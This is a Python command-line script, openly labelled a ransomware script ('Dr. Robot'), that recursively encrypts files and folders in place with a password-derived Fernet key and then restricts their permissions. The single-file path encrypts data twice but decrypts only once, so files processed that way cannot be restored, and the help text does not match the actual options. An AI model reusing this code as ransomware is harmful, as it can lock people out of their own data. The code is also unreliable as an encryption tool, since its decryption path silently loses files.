#!/usr/bin/env python3

import pathlib
import secrets
import sys
import os
import stat
import base64
import getpass
import logging
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

logging.basicConfig(filename="file_encryptor.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

def help_message(): # Print the help message
    help_message = '''
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Dr. Robot: A Ransomware Script

    Author: John Hilde
    Source: https://github.com/john-hilde/Dr.Robot
    Version: 1.0
    Release:
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Usage:

    drrobot [-show]
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Positional Arguments:

    path                                    Path to the file to encrypt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Options:

    -e       --encrypt     [ENCRYPT]        Notates to encrypt the file
    -s       --salt-size   [SALT-SIZE]      Size of the salt
    -d       --decrypt     [DECRYPT]        Notates to decrypt the file
    -show    --show        [SHOW]           Display help information
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Example usage:

    drrobot -e test-file -s 12
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        '''
    print(help_message)
    sys.exit(0)

def logo():
    logo = """
\033[91m
                       ⠀⠀⠀⠀⠀⣀⣀⣀⣀⣠⣤⣤⣄⣀⣀⣀⣀⠀⠀⠀⠀⠀
                       ⢀⣠⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀
                       ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
                       ⣿⣿⣿⡿⠛⠉⠉⠙⠿⣿⣿⣿⣿⠿⠋⠉⠉⠛⢿⣿⣿⣿
                       ⣿⣿⣿⣶⣿⣿⣿⣦⠀⢘⣿⣿⡃⠀⣴⣿⣿⣿⣶⣿⣿⣿
                       ⣿⣿⣿⣏⠉⠀⠈⣙⣿⣿⣿⣿⣿⣿⣋⠁⠀⠉⣹⣿⣿⣿
                       ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                       ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                       ⢸⣿⣿⣎⠻⣿⣿⣿⣿⡿⠋⠙⢿⣿⣿⣿⣿⠟⣱⣿⣿⡇
                       ⠀⢿⣿⣿⣧⠀⠉⠉⠉⠀⢀⡀⠀⠉⠉⠉⠀⣼⣿⣿⡿⠀
⠀                       ⠈⢻⣿⣿⣷⣶⣶⣶⣶⣿⣿⣶⣶⣶⣶⣾⣿⣿⡟⠁⠀
⠀                       ⠀⠀⠹⣿⣿⣿⣿⣿⣿⠉⠉⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
   ⠀⠀⠀                    ⠀⠈⠻⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
                       ⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣦⣴⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀

    .------.------.------.     .------.------.------.------.------.
    |D.--. |R.--. |..--. |.-.  |R.--. |O.--. |B.--. |O.--. |T.--. |
    | :/\: | :(): | :(): ((5)) | :(): | :/\: | :(): | :/\: | :/\: |
    | (__) | ()() | ()() |'-.-.| ()() | :\/: | ()() | :\/: | (__) |
    | '--'D| '--'R| '--'.| ((1)| '--'R| '--'O| '--'B| '--'O| '--'T|
    `------`------`------'  '-'`------`------`------`------`------'
"""

    # ANSI escape sequence for red color
    red_color = "\u001b[31m"
    # ANSI escape sequence to reset color to default
    reset_color = "\u001b[0m"

    # Add color formatting to the logo
    colored_logo = red_color + logo + reset_color

    print("\033[91m" + logo + "\033[0m")

def clear_terminal():
    """Clears the terminal screen."""
    # Clear the terminal based on the OS
    if os.name == "nt":  # For Windows
        _ = os.system("cls")
    else:  # For Linux and Mac
        _ = os.system("clear")

def generate_salt(size):
    """Generate the salt used for key derivation,
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)
    

def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()

def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Generates a key from a `password` and the salt.
    If `load_existing_salt` is True, it'll load the salt from a file
    in the current directory called "salt.salt".
    If `save_salt` is True, then it will generate a new salt
    and save it to "salt.salt" """
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)

def encrypt(filename, key):
    logger.info(f"Encrypting file: {filename}")
    """Given a filename (str) and key (bytes), it encrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)
    
    os.chmod(filename, stat.S_IRUSR | stat.S_IWUSR)
        
def decrypt(filename, key):
    logger.info(f"Decrypting file: {filename}")
    """Given a filename (str) and key (bytes), it decrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("\u001b[31m[!] Invalid token, most likely the password is incorrect\u001b[0m")
        return
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)
    
    os.chmod(filename, stat.S_IRUSR | stat.S_IWUSR)
    
def encrypt_folder(foldername, key):
    logger.info(f"Encrypting folder: {foldername}")
    # Set folder permissions to read, write, and execute for the owner only
    os.chmod(foldername, stat.S_IRWXU)

    # Encrypt the files within the folder
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"\u001b[32m[*] Encrypting {child}\u001b[0m")
            # encrypt the file
            encrypt(child, key)
        elif child.is_dir():
            # if it's a folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)
            
def decrypt_folder(foldername, key):
    logger.info(f"Decrypting folder: {foldername}")
    # Set folder permissions to read, write, and execute for the owner only
    os.chmod(foldername, stat.S_IRWXU)

    # Decrypt the files within the folder
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"\u001b[32m[*] Decrypting {child}\u001b[0m")
            # decrypt the file
            decrypt(child, key)
        elif child.is_dir():
            # if it's a folder, decrypt the entire folder by calling this function recursively
            decrypt_folder(child, key)
            
def restrict_file_access(filename):
    uid = os.getuid()  # Get your user ID
    gid = os.getgid()  # Get your group ID

    # Change the owner of the file
    os.chown(filename, uid, gid)

    # Set the file permissions to read, write, and execute for the owner only
    os.chmod(filename, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)

def encrypt_file_contents(filename, key):
    logger.info(f"Encrypting file contents: {filename}")
    """Given a filename (str) and key (bytes), it encrypts the contents of the text file"""
    f = Fernet(key)
    with open(filename, "r") as file:
        # read the file contents
        file_contents = file.read()
    # encrypt the file contents
    encrypted_contents = f.encrypt(file_contents.encode())
    # overwrite the original file with the encrypted contents
    with open(filename, "w") as file:
        file.write(encrypted_contents.decode())

def main():
    import argparse
    parser = argparse.ArgumentParser(description="File Encryptor Script with a Password")
    parser.add_argument("path", nargs='?', help="Path to encrypt/decrypt, can be a file or an entire folder")
    parser.add_argument("-s", "--salt-size", help="If this is set, a new salt with the passed size is generated", type=int)
    parser.add_argument("-e", "--encrypt", action="store_true", help="Whether to encrypt the file/folder, only -e or -d can be specified.")
    parser.add_argument("-d", "--decrypt", action="store_true", help="Whether to decrypt the file/folder, only -e or -d can be specified.")
    parser.add_argument("-t", "--times", type=int, help="Number of times to encrypt/decrypt the file/folder")
    parser.add_argument("-show", action = 'store_true', help="Display help information")
    # parse the arguments
    args = parser.parse_args()
    
    if args.show or not (args.encrypt or args.decrypt) or not args.path:
        help_message()
        
    if args.times is None:
        args.times = 1

        
    # get the password
    if args.encrypt:
        password = getpass.getpass("Enter the password for encryption: ")
    elif args.decrypt:
        password = getpass.getpass("Enter the password you used for encryption: ")
    # generate the key
    if args.salt_size:
        key = generate_key(password, salt_size=args.salt_size, save_salt=True)
    else:
        key = generate_key(password, load_existing_salt=True)

    # check if both encrypt and decrypt are specified
    if args.encrypt and args.decrypt:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")
    elif args.encrypt:
        for i in range(args.times):
            if os.path.isfile(args.path):
                # if it is a file, encrypt it
                encrypt(args.path, key)
                encrypt_file_contents(args.path, key)  # Encrypt the file contents
                restrict_file_access(args.path)  # Restrict file access
            elif os.path.isdir(args.path):
                encrypt_folder(args.path, key)
                restrict_file_access(args.path)  # Restrict folder access
                
    elif args.decrypt:
        for i in range(args.times):
            if os.path.isfile(args.path):
                decrypt(args.path, key)
            elif os.path.isdir(args.path):
                decrypt_folder(args.path, key)
    else:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")

if __name__ == "__main__":
    clear_terminal()
    logo()
    main()
